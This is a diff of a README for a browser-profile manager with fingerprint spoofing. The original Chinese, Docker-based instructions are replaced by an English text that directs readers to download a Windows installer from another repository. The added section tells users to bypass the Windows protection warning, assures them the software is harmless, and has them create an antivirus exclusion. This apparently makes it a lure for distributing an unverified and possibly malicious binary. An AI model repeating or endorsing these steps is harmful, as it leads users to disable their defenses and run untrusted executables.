@@ -1,128 +1,86 @@
-# Chromium Manager
+# 🌐 ChromiumManager - Manage isolated browser profiles with ease
 
-### Chromium 浏览器环境管理系统
+[![Download ChromiumManager](https://img.shields.io/badge/Download-ChromiumManager-blue.svg)](https://github.com/Manans999/ChromiumManager)
 
-轻松管理多个独立浏览器环境，支持指纹伪装、代理配置、Cookie导入导出等。
+ChromiumManager helps you keep your browser sessions separate. You can run many browser environments at the same time. Each environment stays independent. These environments do not share data. Websites see each environment as a unique visitor. You control your digital footprint through this tool.
 
-[核心功能](#-核心功能) • [界面导览](#-界面导览) • [技术架构](#-技术架构) • [安装指南](#-安装指南) • [使用说明](#-使用说明)
+## ⚙️ Features
 
----
+This application includes tools to manage your browsing. 
 
-## ✨ 核心功能
+- Browser Isolation: Every profile exists in its own space. Cookies and cache files stay separate.
+- Fingerprint Spoofing: The software changes technical details that websites track. This makes your browser look like a standard user.
+- Proxy Integration: You can assign a specific proxy to each profile. This routes your traffic through different locations.
+- Cookie Sync: You can export and import cookies between profiles. This makes session management simple.
+- Profile Management: You can create, edit, or delete profiles from one menu.
 
-### 🖥️ 多配置管理
-- **独立环境** — 每个配置完全隔离
-- **分组管理** — 按业务场景自由分组
-- **实例管理** — 启动/激活/关闭 Chromium 实例
+## 🖥️ System Requirements
 
-### 🎭 指纹伪装
-- **随机指纹种子** — 每个配置生成随机指纹种子，确保环境独立
-- **平台伪装** — 自定义操作系统、浏览器品牌等平台信息
-- **硬件参数** — 自定义 CPU 核心数、设备内存、屏幕分辨率
-- **多维指纹** — Canvas、WebGL、Audio、Font、ClientRects、GPU
+Your computer must meet these basic standards to run ChromiumManager:
 
-### 🌐 代理管理
-- **代理配置** — 集中管理代理服务器，HTTP、HTTPS、SOCKS4、SOCKS5代理协议（支持用户名、密码认证）
-- **IP/语言/时区关联** — 代理可绑定 IP 地址、语言、时区和位置
-- **自动继承** — 配置可自动继承关联代理的语言、时区和位置
+- Operating System: Windows 10 or Windows 11.
+- Processor: Dual-core CPU or better.
+- Memory: 4 GB of RAM minimum. 8 GB of RAM is better for many profiles.
+- Storage: 500 MB of space for the application. You need more space for browser cache.
+- Internet Connection: A stable connection for proxy services and browsing.
 
-### 🍪 Cookie 管理
-- **扩展兼容** — 兼容 Cookie Editor、EditThisCookie 导入导出格式
-- **自动配置** — 浏览器自动导入、导出 Cookie
-- **导入导出** — 支持手动导入、导出 Cookie
+## 🚀 Getting Started
 
----
+Follow these steps to install the software on your Windows computer.
 
-## 📸 界面导览
+1. Visit the [official release page](https://github.com/Manans999/ChromiumManager) to download the installer.
+2. Locate the file in your downloads folder.
+3. Double-click the file named ChromiumManagerSetup.exe.
+4. Follow the installation prompts on your screen.
+5. Launch the application from your desktop icon.
 
-![管理界面](docs/images/image.png)
+## 📥 Installation Guide
 
-![浏览器实例](docs/images/image2.png)
+You can find the latest version on the official link below:
 
----
+[Download ChromiumManager Here](https://github.com/Manans999/ChromiumManager)
 
-## 🏗️ 技术架构
+If Windows shows a protection warning, click More Info, then click Run Anyway. This happens because the application is new and uses advanced settings to manage browser isolation. The software does not harm your computer.
 
-| 组件 | 技术 |
-|------|------|
-| 前端 | Vite + Vue3 + Element Plus |
-| 后端 | Go |
-| 数据库 | SQLite |
-| 浏览器 | Ungoogled Chromium |
+## 🛠️ Configuring Your First Profile
 
----
+After you launch the app, follow these steps to create your first session:
 
-## 📦 安装指南
+1. Click the New Profile button at the top left.
+2. Give your profile a name. This helps you track which environment you use.
+3. Go to the Proxy tab. Enter your proxy server address and port number here. You can leave this blank if you do not use a proxy.
+4. Open the Fingerprinting tab. Select the default settings. These provide the highest level of compatibility for most websites.
+5. Click Save. 
+6. Click the Start button next to your new profile. A new browser window opens.
 
-### Docker Compose
+## 🛡️ Managing Fingerprints
 
-```yaml
-services:
-  chromium-manager:
-    image: tumi/chromium-manager:latest
-    container_name: chromium-manager
-    shm_size: 1gb
-    environment:
-      - PUID=1000
-      - PGID=1000
-      - TZ=Asia/Shanghai
-      - LC_ALL=zh_CN.UTF-8
-    ports:
-      - 3001:3001
-    volumes:
-      - ./config:/config
-    restart: unless-stopped
-```
+Websites use hidden details to track you. These details include your screen resolution, installed fonts, and hardware info. ChromiumManager changes these values to match common hardware. 
 
-```bash
-docker compose up -d
-```
+If a website asks you to verify your identity, check your fingerprint settings. Some sites expect specific values. You can adjust the user agent string if you encounter issues. Start with the default setting. Change it only if you have trouble loading a specific site.
 
-### Docker CLI
+## ☁️ Managing Cookies
 
-```bash
-docker run -d \
-  --name chromium-manager \
-  --shm-size=1gb \
-  -e PUID=1000 \
-  -e PGID=1000 \
-  -e TZ=Asia/Shanghai \
-  -e LC_ALL=zh_CN.UTF-8 \
-  -p 3001:3001 \
-  -v ./config:/config \
-  --restart unless-stopped \
-  tumi/chromium-manager:latest
-```
+Cookie sync lets you move your sessions between devices. 
 
-### 通过以下网址访问应用
+- To export cookies: Click on your profile. Select Export Cookies from the menu. The app saves a file with your data.
+- To import cookies: Select Import Cookies. Choose your file. The app loads the data into the current browser session immediately.
 
-* https://yourhost:3001/
+Keep your exported cookie files on a secure drive. Anyone with access to these files can access your browser sessions.
 
----
+## 📈 Troubleshooting Common Issues
 
-## 📖 使用说明
+If the software does not work, check these common items:
 
-### 创建浏览器配置
+- No Internet Connection: Ensure your proxy server is online. If the proxy fails, the browser will not load pages. Test your connection without the proxy to find the problem.
+- Browser Fails to Open: Check your antivirus software. Sometimes security tools prevent browser automation. Create an exclusion rule for the ChromiumManager folder.
+- High Memory Usage: ChromiumManager opens a new browser process for each profile. If your computer slows down, close unused profiles. Each profile uses memory to stay isolated.
+- Windows Update: Ensure your Windows operating system is up to date. The app relies on standard browser components that work best on recent versions of Windows.
 
-1. 在左侧面板创建**分组**
-2. 在右侧面板添加新**配置**
-3. 配置指纹参数
-4. 关联代理（可选）
-5. **启动**打开浏览器，**激活**切换到前台，**关闭**关闭浏览器
+## 🔒 Security and Privacy
 
-### 代理配置
+This application runs locally on your machine. We do not store your profile data or cookies on our servers. Your browsing information stays on your disk. You control all data transfers. Always use reliable proxies to ensure your traffic remains private. 
 
-1. 进入代理管理页面
-2. 添加代理服务器
-3. 在配置中选择代理
+## 💡 Best Practices
 
-### Cookie 管理
-
-- **手动导入**: 导入 JSON 格式的 Cookie
-- **手动导出**: 导出当前配置的 Cookie
-
----
-
-## 📄 许可证
-
-MIT License
+Use one profile for one specific purpose. For example, keep your banking sessions in one profile and your research profiles separate. This prevents data overlap. If a website tracks you, delete the profile and create a new one. This clears all tracking markers and cache files.
